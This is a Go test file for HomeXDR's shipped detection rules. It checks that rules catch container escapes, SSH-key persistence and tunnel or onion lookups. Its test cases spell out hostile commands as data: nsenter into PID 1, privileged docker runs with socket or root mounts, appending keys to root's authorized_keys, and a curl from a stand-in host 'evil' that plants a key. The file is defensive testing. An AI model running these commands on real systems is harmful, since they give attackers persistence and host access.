package detect

import (
	"path/filepath"
	"testing"

	"github.com/Netdoodle/homexdr/shared/event"
)

// The rules HomeXDR ships (rules/homexdr) must load and fire on what they describe.
func TestShippedRules(t *testing.T) {
	rules, errs := LoadDir(filepath.Join("..", "..", "..", "rules"))
	for _, e := range errs {
		t.Errorf("load %s: %v", e.Path, e.Err)
	}
	e := NewEngine()
	e.SetRules(rules)

	linux := &event.OS{Platform: "linux"}
	proc := func(exe, cmd string) *event.Event {
		return &event.Event{
			Host:    event.Host{OS: linux},
			Event:   event.Meta{Category: []string{event.CategoryProcess}, Type: []string{event.TypeStart}, Action: "exec"},
			Process: &event.Process{Executable: exe, Name: filepath.Base(exe), CommandLine: cmd},
		}
	}
	inContainer := func(ev *event.Event) *event.Event {
		ev.Container = &event.Container{ID: "abc123", Name: "app"}
		return ev
	}
	dns := func(name string) *event.Event {
		return &event.Event{
			Host:  event.Host{OS: linux},
			Event: event.Meta{Category: []string{event.CategoryNetwork}, Module: event.ModuleDNS, Dataset: "dns.adguard"},
			DNS:   &event.DNS{Question: event.DNSQuestion{Name: name, Type: "A"}},
		}
	}
	login := func(user, ip, method string, labels map[string]string) *event.Event {
		return &event.Event{
			Host:   event.Host{OS: linux},
			Event:  event.Meta{Category: []string{event.CategoryAuthentication, event.CategorySession}, Action: "ssh_login", Outcome: event.OutcomeSuccess, Module: event.ModuleAuthLog},
			User:   &event.User{Name: user},
			Source: &event.Endpoint{IP: ip},
			Data:   map[string]any{"auth_method": method},
			Labels: labels,
		}
	}
	key := map[string]string{"ssh_key": "SHA256:abc"}
	named := map[string]string{"ssh_key": "SHA256:abc", "ssh_key_name": "backup job"}

	cases := []struct {
		name string
		ev   *event.Event
		want string // rule ID, or "" for no shipped rule
	}{
		{"nsenter host", proc("/usr/bin/nsenter", "nsenter -t 1 -m -u -i -n bash"), "12a41d04-9526-4f50-b148-7b3eff2c42b0"},
		{"nsenter target=1", proc("/usr/bin/nsenter", "nsenter --target=1 --mount sh"), "12a41d04-9526-4f50-b148-7b3eff2c42b0"},
		{"nsenter other pid", proc("/usr/bin/nsenter", "nsenter -t 12345 -n ip a"), ""},
		{"privileged run", proc("/usr/bin/docker", "docker run -d --privileged --name x alpine"), "ce785d0b-3a01-432a-8759-aa1bfce55158"},
		{"socket mount", proc("/usr/bin/docker", "docker run -v /var/run/docker.sock:/var/run/docker.sock portainer/portainer"), "ce785d0b-3a01-432a-8759-aa1bfce55158"},
		{"root mount", proc("/usr/bin/docker", "docker run -it -v /:/host alpine chroot /host"), "ce785d0b-3a01-432a-8759-aa1bfce55158"},
		{"plain run", proc("/usr/bin/docker", "docker run -d -p 8080:80 nginx"), ""},
		{"docker cli in container", inContainer(proc("/usr/local/bin/docker", "docker ps")), "e1f0647a-e172-44d2-b1da-b737c7b4e78f"},
		{"curl socket in container", inContainer(proc("/usr/bin/curl", "curl --unix-socket /var/run/docker.sock http://localhost/containers/json")), "e1f0647a-e172-44d2-b1da-b737c7b4e78f"},
		{"docker cli on host", proc("/usr/bin/docker", "docker ps"), ""},
		{"append key", proc("/bin/bash", `bash -c "echo ssh-ed25519 AAAA x >> /root/.ssh/authorized_keys"`), "c3cea956-e908-4175-8868-7586aebcabb2"},
		{"curl key", proc("/usr/bin/curl", "curl -fsSL http://evil/k -o /boot/config/ssh/root/authorized_keys"), "c3cea956-e908-4175-8868-7586aebcabb2"},
		{"read keys", proc("/bin/cat", "cat /root/.ssh/authorized_keys"), ""},
		{"grep keys", proc("/bin/grep", "grep -c ssh- /root/.ssh/authorized_keys 2>/dev/null"), ""},
		{"go append", proc("/bin/bash", `bash -c "echo /tmp/x >> /boot/config/go"`), "20d3be3f-f45f-4b68-9060-ea10ef764bf4"},
		{"go sed", proc("/bin/sed", "sed -i '$a /tmp/x' /boot/config/go"), "20d3be3f-f45f-4b68-9060-ea10ef764bf4"},
		{"go read", proc("/bin/cat", "cat /boot/config/go"), ""},
		{"go dir lookalike", proc("/bin/cp", "cp a /boot/config/good"), ""},
		{"plugin url", proc("/usr/local/sbin/plugin", "plugin install https://example.org/x.plg"), "d6e263b8-bd85-4342-ad7f-424b9fcba940"},
		{"plugin unraid", proc("/usr/local/sbin/plugin", "plugin install https://stable.dl.unraid.net/x.plg"), ""},
		{"ngrok", dns("1a2b.ngrok-free.app"), "eb926ea2-7e6a-49bc-b250-b73f9e92160c"},
		{"quick tunnel", dns("abc-def.trycloudflare.com"), "eb926ea2-7e6a-49bc-b250-b73f9e92160c"},
		{"cloudflare", dns("www.cloudflare.com"), ""},
		{"onion", dns("abcdefghijklmnop.onion"), "604a03b3-b817-4066-97a2-5862090322bc"},
		{"tor2web", dns("abcdefghijklmnop.onion.ws"), "604a03b3-b817-4066-97a2-5862090322bc"},
		{"paste", dns("transfer.sh"), "4a5f9d6b-eeb3-4849-af56-6761e9b46fec"},
		{"paste lookalike", dns("mytransfer.sh.example.com"), ""},
		{"ssh public", login("root", "203.0.113.9", "publickey", named), "50843b3d-bf03-4724-91ab-1536d24ad20c"},
		{"ssh lan", login("root", "192.168.10.52", "publickey", named), ""},
		{"ssh tailscale", login("root", "100.81.93.1", "publickey", named), ""},
		{"root password", login("root", "192.168.10.52", "password", nil), "6cb448ce-155d-45f3-90cf-bb13893b5ba4"},
		{"user password", login("alice", "192.168.10.52", "password", nil), ""},
		{"unnamed key", login("root", "192.168.10.52", "publickey", key), "91185cb5-b28c-46a0-a12b-da23346de6d3"},
		{"named key", login("root", "192.168.10.52", "publickey", named), ""},
	}
	ours := map[string]bool{}
	for _, r := range rules {
		ours[r.ID] = true
	}
	for _, c := range cases {
		var got []string
		for _, r := range e.Evaluate(c.ev) {
			if ours[r.ID] {
				got = append(got, r.ID)
			}
		}
		switch {
		case c.want == "" && len(got) > 0:
			t.Errorf("%s: unexpected hits %v", c.name, got)
		case c.want != "" && (len(got) != 1 || got[0] != c.want):
			t.Errorf("%s: hits %v, want %s", c.name, got, c.want)
		}
	}
}
